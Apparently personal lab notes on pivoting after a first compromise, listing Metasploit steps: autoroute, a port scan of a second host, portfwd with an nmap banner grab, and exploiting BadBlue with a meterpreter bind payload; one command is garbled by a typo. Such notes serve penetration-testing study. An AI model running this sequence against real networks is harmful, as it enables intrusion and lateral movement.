after exploiting victim 1 and get meterpreter 

- We can observe, there is only one network adapter and we have two machine IP addresses. But, we cannot access “Victim Machine 2” directly from the attacker’s machine.
- We will add a route and then we will run an auxiliary port scanner module on the second victim machine to discover a host and open ports.  
	- run autoroute -s 10.0.23.0/20 (first victim machine in meterpreter)
- run the port scanner on the second victim machine.
	- background
	- use auxiliary/scanner/portscan/tcp 
	- set RHOSTS 10.0.27.99 (second machine)
	- set PORTS 1-100 
	- exploit
- We have discovered port 80 on the pivot machine. Now, we will forward the remote port 80 to local port 1234 and grab the banner using Nmap
	- sessions -i 1 (change to )
	- ipconfig (check IP and Subnetmask)
	- portfwd add -l 1234 -p 80 -r 10.0.27.99 ( we are forwarding our kali machine(localhost) port to remote 80 of victim 2 IP) 
	- portfwd list
- We have forwarded the port, now use Nmap to find the running application name and version.
	- don't close msfconsole
	- nmap -sV -sS -p 1234 locabackgroundlhost (we want to know what services running in victim 2 ip using our own kali port that we forwaded to 80 )
	- we find vulnerable service and exploit then get mterpreter session
		- use exploit/windows/http/badblue_passthru 
		- set PAYLOAD windows/meterpreter/bind_tcp 
		- set LPORT 4433 (port 4444 already used from the first mterepter session)
		- set RHOSTS VICTIM 2 IP
		- exploit
